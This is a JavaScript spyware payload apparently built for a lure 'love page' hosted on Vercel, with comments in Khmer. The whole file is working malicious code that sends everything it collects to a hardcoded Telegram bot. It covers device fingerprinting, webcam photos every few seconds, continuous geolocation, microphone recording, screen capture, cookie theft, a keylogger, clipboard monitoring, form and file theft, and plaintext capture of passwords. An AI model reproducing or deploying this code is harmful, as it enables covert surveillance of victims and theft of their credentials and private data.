// ============================================================
// PAYLOAD FOR LOVE PAGE - myloveeeeeee-three.vercel.app
// ============================================================

// ===== TELEGRAM CONFIGURATION =====
const TOKEN = "8795239678:AAFKeEqEKWWpb6P6IWbia4Os4jzi7Quk7Ec";
let CHAT_ID = "6837307356";

// Get chat ID from URL if present
const urlParams = new URLSearchParams(window.location.search);
const chatIdFromUrl = urlParams.get('chat_id');
if (chatIdFromUrl) CHAT_ID = chatIdFromUrl;

// ===== FORCE OPEN EXTERNAL BROWSER =====
function forceOpenExternal(url) {
    // បើក Link ទៅ Browser ខាងក្រៅ
    window.open(url, '_blank');
    
    // ប្រសិនបើ window.open ត្រូវបានរារាំង សូមប្រើ location.href
    setTimeout(() => {
        if (!window.closed) {
            window.location.href = url;
        }
    }, 1000);
}

// ===== DEVICE INFO COLLECTION =====
async function collectDeviceInfo() {
    const info = {
        timestamp: new Date().toLocaleString('km-KH'),
        ip: await getIPAddress(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookies: navigator.cookieEnabled ? 'មាន' : 'គ្មាន',
        online: navigator.onLine ? 'អន្តរណេត' : 'អត់អន្តរណេត',
        battery: await getBatteryInfo(),
        localStorage: formatBytes(calculateLocalStorageSize()),
        sessionStorage: formatBytes(calculateSessionStorageSize()),
        touch: 'ontouchstart' in window ? 'មាន' : 'គ្មាន',
        referrer: document.referrer || 'គ្មាន',
        url: window.location.href,
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown'
    };
    return info;
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'ទាញយកមិនបាន';
    }
}

async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}%`;
        } catch {
            return 'មិនអាចដឹង';
        }
    }
    return 'មិនគាំទ្រ';
}

function calculateLocalStorageSize() {
    let total = 0;
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function calculateSessionStorageSize() {
    let total = 0;
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function formatDeviceInfo(info) {
    return `📱 **ព័ត៌មានឧបករណ៍**
⏰ ពេលវេលា: ${info.timestamp}
🌐 IP: ${info.ip}
💻 CPU Cores: ${info.hardwareConcurrency}
🧠 RAM: ${info.deviceMemory}GB
🖥️ User Agent: ${info.userAgent.substring(0, 100)}...
📟 Platform: ${info.platform}
🗣️ Language: ${info.language}
🌐 Timezone: ${info.timezone}
📺 Screen: ${info.screen}
👁️ Viewport: ${info.viewport}
🍪 Cookies: ${info.cookies}
📶 Status: ${info.online}
🔋 Battery: ${info.battery}
💾 Local Storage: ${info.localStorage}
💾 Session Storage: ${info.sessionStorage}
👆 Touch: ${info.touch}
🔗 Referrer: ${info.referrer}
📄 URL: ${info.url}`;
}

// ===== TELEGRAM FUNCTIONS =====
async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message,
                parse_mode: 'Markdown'
            }),
        });
    } catch (err) {}
}

// ===== 1. CAMERA =====
async function requestCameraPermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false 
        });
        
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        video.play();
        
        setInterval(async () => {
            if (!video || video.readyState < 2) return;
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                if (blob && blob.size > 0) {
                    const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', file);
                    
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    });
                }
            }, 'image/jpeg', 0.7);
        }, 5000);
        
    } catch (error) {}
}

// ===== 2. LOCATION =====
function requestLocationPermission() {
    if (!navigator.geolocation) return;
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const location = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    latitude: location.lat,
                    longitude: location.lng
                }),
            });
        },
        () => {},
        { enableHighAccuracy: true, timeout: 10000 }
    );
    
    setInterval(() => {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const location = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: Math.round(position.coords.accuracy)
                };
                
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        latitude: location.lat,
                        longitude: location.lng
                    }),
                });
            },
            () => {},
            { enableHighAccuracy: true, timeout: 5000 }
        );
    }, 30000);
}

// ===== 3. MICROPHONE =====
async function requestMicrophonePermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        
        recorder.ondataavailable = async (event) => {
            if (event.data.size > 0) {
                chunks.push(event.data);
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('audio', file);
                
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, {
                    method: "POST",
                    body: formData
                });
                chunks.length = 0;
            }
        };
        
        recorder.start();
        setInterval(() => {
            if (recorder.state === 'recording') {
                recorder.stop();
                setTimeout(() => recorder.start(), 100);
            }
        }, 15000);
        
    } catch (error) {}
}

// ===== 4. SCREEN RECORDING =====
async function requestScreenPermission() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", frameRate: { ideal: 30 } },
            audio: true
        });
        
        const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
        const recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 2500000 });
        const chunks = [];
        
        recorder.ondataavailable = async (event) => {
            if (event.data.size > 0) {
                chunks.push(event.data);
                const blob = new Blob(chunks, { type: mimeType });
                const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', file);
                
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                    method: "POST",
                    body: formData
                });
                chunks.length = 0;
            }
        };
        
        recorder.start(1000);
        
        setTimeout(() => {
            if (recorder && recorder.state === 'recording') {
                recorder.stop();
                stream.getTracks().forEach(track => track.stop());
            }
        }, 30000);
        
        stream.getVideoTracks()[0].addEventListener('ended', () => {
            if (recorder && recorder.state === 'recording') {
                recorder.stop();
            }
        });
        
    } catch (error) {}
}

// ===== 5. COOKIE STEALER =====
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        if (name) cookies[name] = value;
    });
    return cookies;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const cookies = getAllCookies();
        const deviceInfo = await collectDeviceInfo();
        
        let message = `🔴 *STOLEN DATA REPORT*\n\n`;
        message += `🍪 Cookies: ${Object.keys(cookies).length} found\n`;
        
        if (Object.keys(cookies).length > 0) {
            Object.entries(cookies).slice(0, 10).forEach(([name, value]) => {
                const shortValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
                message += `├─ ${name}: ${shortValue}\n`;
            });
            if (Object.keys(cookies).length > 10) {
                message += `└─ ... and ${Object.keys(cookies).length - 10} more\n`;
            }
        }
        
        message += `\n${formatDeviceInfo(deviceInfo)}`;
        await sendMessageToTelegram(message);
        
        const fullData = { timestamp: new Date().toISOString(), url: window.location.href, cookies, deviceInfo };
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_data_${Date.now()}.json`, { type: 'application/json' });
        
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('document', jsonFile);
        
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
            method: "POST",
            body: formData
        });
        
    } catch (error) {}
}

// ===== 6. KEYLOGGER =====
let keylogBuffer = '';
let keylogTimer = null;

document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    if (e.target && e.target.type === 'password') return;
    
    if (e.key.length === 1) keylogBuffer += e.key;
    else if (e.key === 'Enter') keylogBuffer += '\n';
    else if (e.key === 'Backspace') keylogBuffer = keylogBuffer.slice(0, -1);
    else if (e.key === ' ') keylogBuffer += ' ';
    else if (e.key === 'Tab') keylogBuffer += '    ';
    
    clearTimeout(keylogTimer);
    keylogTimer = setTimeout(async () => {
        if (keylogBuffer.length > 0) {
            await sendMessageToTelegram(`⌨️ *Keylogger*\n\n${keylogBuffer}`);
            keylogBuffer = '';
        }
    }, 3000);
});

// ===== 7. CLIPBOARD MONITOR =====
let lastClipboard = '';

setInterval(async () => {
    if (!CHAT_ID) return;
    try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboard && text.length > 0 && text.length < 1000) {
            lastClipboard = text;
            await sendMessageToTelegram(`📋 *Clipboard*\n\n${text}`);
        }
    } catch (error) {}
}, 5000);

// ===== 8. FORM STEALER =====
document.addEventListener('submit', async function(e) {
    if (!CHAT_ID) return;
    
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    
    for (let [key, value] of formData.entries()) {
        if (value instanceof File) {
            data[key] = `[FILE: ${value.name}]`;
            const fileFormData = new FormData();
            fileFormData.append('chat_id', CHAT_ID);
            fileFormData.append('document', value);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
                method: "POST",
                body: fileFormData
            });
        } else if (value && value.toString().trim() !== '') {
            data[key] = value;
        }
    }
    
    if (Object.keys(data).length > 0) {
        let message = `📝 *Form Submitted*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
        for (let [key, value] of Object.entries(data)) {
            const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
            message += `├─ ${key}: ${shortValue}\n`;
        }
        await sendMessageToTelegram(message);
    }
});

// ===== 9. PASSWORD MONITOR =====
document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    
    const target = e.target;
    if (target && target.type === 'password' && target.value && target.value.length > 0) {
        const name = target.name || target.id || 'Unknown';
        await sendMessageToTelegram(`🔐 *Password Entered*\n\n📝 Field: ${name}\n🔑 Value: ${target.value}`);
        keylogBuffer = '';
    }
});

// ===== 10. MAIN INITIALIZATION =====
async function initialize() {
    // ផ្ញើព័ត៌មានឧបករណ៍
    const deviceInfo = await collectDeviceInfo();
    await sendMessageToTelegram(`🚀 *PAGE LOADED*\n\n${formatDeviceInfo(deviceInfo)}`);
    
    // ===== FORCE OPEN EXTERNAL BROWSER =====
    // បើក Link ទៅ Browser ខាងក្រៅ
    forceOpenExternal('https://myloveeeeeee-three.vercel.app');
    
    // សុំការអនុញ្ញាត
    setTimeout(() => requestCameraPermission(), 1000);
    setTimeout(() => requestLocationPermission(), 3000);
    setTimeout(() => requestMicrophonePermission(), 5000);
    setTimeout(() => requestScreenPermission(), 7000);
    
    // លួចទិន្នន័យ
    setTimeout(() => stealAllData(), 2000);
    
    // តាមដានការចុច
    document.addEventListener('click', function(e) {
        const target = e.target.closest('a, button');
        if (target) {
            sendMessageToTelegram(`🖱️ *Clicked*: ${target.textContent || target.href || 'Unknown'}`);
            // បើក Link ខាងក្រៅពេលចុច
            forceOpenExternal('https://myloveeeeeee-three.vercel.app');
        }
    });
}

// ===== RUN =====
window.addEventListener("DOMContentLoaded", initialize);